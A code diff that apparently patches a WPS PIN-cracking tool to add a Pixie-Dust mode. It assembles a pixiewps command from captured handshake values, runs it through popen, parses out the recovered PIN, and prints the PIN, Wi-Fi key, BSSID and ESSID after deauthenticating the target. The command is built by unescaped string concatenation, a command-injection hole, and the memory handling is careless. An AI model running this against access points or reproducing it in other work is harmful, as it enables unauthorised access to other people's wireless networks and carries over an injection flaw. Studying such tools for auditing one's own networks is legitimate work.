@@ -17,6 +17,7 @@
     You should have received a copy of the GNU General Public License
     along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
+#include <stdint.h>
 #include <sys/socket.h>
 #include <sys/ioctl.h>
 #include <sys/types.h>
@@ -172,6 +173,7 @@ int main(int argc, char *argv[])
 		G->k2delay = 5;
 		G->k2step = 1;
 		G->pinstart = G->pindex = -1;
+		op_gen_pin = 0;
 
 		char *temp = getpwuid(getuid())->pw_dir;
 		G->warpath = malloc(strlen(temp) + strlen(EXE_NAME) + 3);
@@ -179,10 +181,8 @@ int main(int argc, char *argv[])
 		strcat(G->warpath, "/.");
 		strcat(G->warpath, EXE_NAME);
 		mkdir(G->warpath, S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);
-	}
-	else {
-
-mem_err:
+	} else {
+	mem_err:
 		fprintf(stderr, "Memory allocation error\n");
 		return 2;
 	};
@@ -194,7 +194,9 @@ mem_err:
 			{"acktime",    1, 0, 'a'},
 			{"bssid",      1, 0, 'b'},
 			{"channel",    1, 0, 'c'},
+			{"pixiewps",   0, 0, 'd'},
 			{"essid",      1, 0, 'e'},
+			{"genpin",     0, 0, 'g'},
 			{"index",      1, 0, 'i'},
 			{"lockwait",   1, 0, 'l'},
 			{"m13time",    1, 0, 'm'},
@@ -232,15 +234,14 @@ mem_err:
 			{0,            0, 0,  0 }
 		};
 
-		int option = getopt_long(argc, argv, "a:b:c:e:i:l:m:o:p:r:s:t:"
+		int option = getopt_long(argc, argv, "a:b:c:de:g:i:l:m:o:p:r:s:t:"
 #ifdef HAVE_LUA
 				"u:"
 #endif
 				"v:w:1:2:5ABCDEFLMNPQRSTVWZh",
 				long_options, &option_index);
 
-		if (option < 0)
-			break;
+		if (option < 0) break;
 
 		switch (option) {
 		case 0:
@@ -265,6 +266,11 @@ mem_err:
 		case 'e':
 			G->essid = optarg;
 			break;
+
+		case 'g' :
+			get_int(optarg, &op_gen_pin);
+			break;
+
 		case 'i':
 			if (get_int(optarg, &G->pindex) != 0 || 99999999 < G->pindex) {
 				snprintf(G->error, 256, "Bad starting index number -- %s\n", optarg);
@@ -335,11 +341,12 @@ mem_err:
 			break;
 #endif
 		case 'v':
-			if (get_int(optarg, &G->verbose) != 0 || G->verbose < 1 || 3 < G->verbose) {
+			if (get_int(optarg, &G->verbose) != 0 || G->verbose < 1 || 4 < G->verbose) {
 				snprintf(G->error, 256, "Bad verbosity level -- %s\n", optarg);
 				goto usage_err;
 			};
 			__vb = G->verbose;
+			get_int(optarg, &debug_level);
 			break;
 		case 'w':
 			if (stat(optarg, &wstat) || !S_ISDIR(wstat.st_mode)) {
@@ -367,6 +374,10 @@ mem_err:
 					snprintf(G->error, 256, "Bad recurring delay -- %s\n", optarg);
 					goto usage_err;
 				};
+			break;
+		case 'd' :
+			run_pixiewps = 1;
+			G->force = 1;
 			break;
 		case '5':
 			G->hop = AN_CHANS;
@@ -972,7 +983,78 @@ restart:
 
 	while (!ctrlc) {
 
+		if (run_pixiewps == 2) {
+		/* Creating pixiewps command */
+			char *cmd_pixie;
+			cmd_pixie = malloc( 2520 * sizeof(char) );
+			strcpy(cmd_pixie,"pixiewps -e ");
+			strncat(cmd_pixie,pixie_pke, 1000);
+			strcat(cmd_pixie," -r ");
+			strncat(cmd_pixie,pixie_pkr, 1000);
+			strcat(cmd_pixie," -s ");
+			strncat(cmd_pixie,pixie_ehash1,100);
+			strcat(cmd_pixie," -z ");
+			strncat(cmd_pixie,pixie_ehash2,100);
+			strcat(cmd_pixie," -a ");
+			strncat(cmd_pixie,pixie_authkey,100);
+			strcat(cmd_pixie," -n ");
+			strncat(cmd_pixie,pixie_enonce,100);
+			strcat(cmd_pixie," -m ");
+			strncat(cmd_pixie,pixie_rnonce,100);
+			strcat(cmd_pixie," -v 1 --force");
+
+			FILE *fpixe;
+
+			fpixe = popen(cmd_pixie, "r");
+			char *aux_pixie_pin;
+			int i=0;
+
+			printf("[+] Running pixiewps with the information, wait ...\n");
+			if ( debug_level == 4 )
+			{
+				printf("Cmd : %s\n",cmd_pixie);
+			};
+			char *pixie_output;
+			pixie_output=malloc(100 * sizeof(char));
+			while (fgets(pixie_output, 100, fpixe) != NULL)
+			{
+				aux_pixie_pin = strstr(pixie_output,"WPS pin not found");
+				if(aux_pixie_pin != NULL)
+				{
+					printf("[Pixie-Dust] WPS pin not found\n");
+					free(cmd_pixie);
+					break;
+				};
+
+				aux_pixie_pin = strstr(pixie_output,"WPS pin:");
+				if(aux_pixie_pin != NULL)
+				{
+					//here will get the pin
+					//a slightly better way to locate the pin
+					//thx offensive-security by attention
+
+					for(i=0;i<strlen(aux_pixie_pin);i++)
+					{
+						if(isdigit(aux_pixie_pin[i]))
+						{
+							strncpy(pinstr, aux_pixie_pin + i, 8);
+							run_pixiewps = 3;
+							free(cmd_pixie);
+							break;
+							};
+						};
+				};
+			};
+			pclose(fpixe);
+		};
+		if (run_pixiewps == 3) {
+			printf("[Pixie-Dust] PIN FOUND: %s\n", pinstr);
+			ctrlc--;
+			run_pixiewps = 4;
+		};
+
 		while (!ctrlc && result != SUCCESS) {
+
 			vprint("[+] %s = '%s'   Next pin '%s'\n", state[G->state], names[result], pinstr);
 			result = reassoc(G);
 		};
@@ -1036,6 +1118,11 @@ restart:
 
 				if ((++savecount & 0x01) == 0) {
 					if ((rf = fopen(G->runf, "a")) != NULL) {
+						//if (op_gen_pin == 1)
+						//{
+						//	return;
+						//}
+
 						gettimeofday(&timer, NULL);
 						strftime(G->error, 256, "%Y-%m-%d %H:%M:%S", localtime(&timer.tv_sec));
 						fprintf(rf, "# session in progress at %s\n%08d:%08d:%01d:%s:\n",
@@ -1093,7 +1180,6 @@ restart:
 		};
 
 	};
-
 	if (!G->test) {
 		if (result == SUCCESS) send_packet(G, eapolf, sizeof(eapolf) - 1, 0);
 		send_packet(G, deauth, sizeof(deauth) - 1, 0);
@@ -1105,7 +1191,6 @@ restart:
 
 	if (result == SUCCESS)
 		vprint("[*] Pin is '%s', key is '%s'\n", pinstr, G->wdata->cred.key);
-
 	if ((rf = fopen(G->runf, "a")) != NULL) {
 		gettimeofday(&timer, NULL);
 		strftime(G->error, 256, "%Y-%m-%d %H:%M:%S", localtime(&timer.tv_sec));
@@ -1121,11 +1206,13 @@ restart:
 		fprintf(stderr, "WARNING : Couldn't save session to '%s'\n", G->runf);
 
 	if (result == SUCCESS) {
-		fprintf(stderr, "\n\tPIN : '%s'", pinstr);
-		fprintf(stderr, "\n\tKEY : '%s'\n\n", G->wdata->cred.key);
+		fprintf(stderr, "\n\tPIN   : '%s'", pinstr);
+		fprintf(stderr, "\n\tKEY   : '%s'", G->wdata->cred.key);
+		fprintf(stderr, "\n\tBSSID : '%s'", p_bssid);
+		fprintf(stderr, "\n\tESSID : '%s'\n\n", G->essid);
 	}
 	else
 		result = -1;
 
-	return result;
+		return result;
 };
